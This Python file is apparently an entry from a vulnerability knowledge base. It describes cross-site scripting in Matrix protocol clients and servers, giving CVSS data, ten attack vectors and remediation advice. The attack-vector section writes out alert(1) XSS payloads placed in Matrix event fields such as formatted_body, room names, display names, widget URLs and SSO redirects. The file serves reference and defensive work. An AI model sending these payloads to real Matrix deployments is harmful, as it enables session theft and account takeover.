#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
Matrix Ecosystem XSS Context

Vulnerability context for Matrix protocol clients and servers.
"""

DETAILS = {
    "title": "Matrix Protocol XSS",
    "severity": "critical",
    "cvss_score": 9.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["matrix", "element", "synapse", "federation", "messaging", "xss"],
    "description": """
Matrix is a decentralized, federated communication protocol. XSS vulnerabilities
in Matrix clients and servers can lead to:
- Session token theft
- Account takeover
- Cross-room attacks via federation
- Widget-based attacks
- E2EE key extraction attempts

Key attack surfaces:
- Message body (m.text, m.notice, m.emote)
- formatted_body (org.matrix.custom.html)
- Room state events (name, topic, avatar)
- Member state (displayname, avatar_url, reason)
- Widgets and integrations
- Markdown rendering
""",
    "attack_vector": """
MATRIX XSS VECTORS:

1. FORMATTED_BODY HTML
   {"format":"org.matrix.custom.html",
    "formatted_body":"<img src=x onerror=alert(1)>"}

2. ROOM STATE XSS
   {"type":"m.room.name",
    "content":{"name":"<script>alert(1)</script>"}}

3. MEMBER DISPLAYNAME
   {"type":"m.room.member",
    "content":{"displayname":"<img src=x onerror=alert(1)>"}}

4. WIDGET URL INJECTION
   {"type":"im.vector.modular.widgets",
    "content":{"url":"javascript:alert(1)"}}

5. REACTION KEY XSS
   {"type":"m.reaction",
    "content":{"m.relates_to":{"key":"<img src=x onerror=alert(1)>"}}}

6. REPLY FALLBACK
   <mx-reply><blockquote><a href="javascript:alert(1)">...</a></blockquote></mx-reply>

7. SSO REDIRECT
   redirectUrl=javascript:alert(1)

8. BRIDGE EXTERNAL URL
   {"external_url":"javascript:alert(1)"}

9. PUSH NOTIFICATION
   Payload injection in push content

10. FILE METADATA
    Malicious filename or mimetype
""",
    "remediation": """
MATRIX XSS PREVENTION:

1. STRICT HTML SANITIZATION
   Use DOMPurify with Matrix-specific config
   Whitelist only safe HTML tags

2. VALIDATE MXC:// URIS
   Check before conversion to media URL

3. SANITIZE DISPLAYNAMES
   Escape before rendering

4. WIDGET URL ALLOWLIST
   Only permit known integration URLs

5. IMPLEMENT CSP
   Strict Content-Security-Policy

6. ESCAPE NOTIFICATIONS
   Sanitize all user content in push

7. VALIDATE SSO REDIRECTS
   Only same-origin or whitelisted URLs

8. SANITIZE BRIDGE METADATA
   Check external_url and other bridge data
""",
}
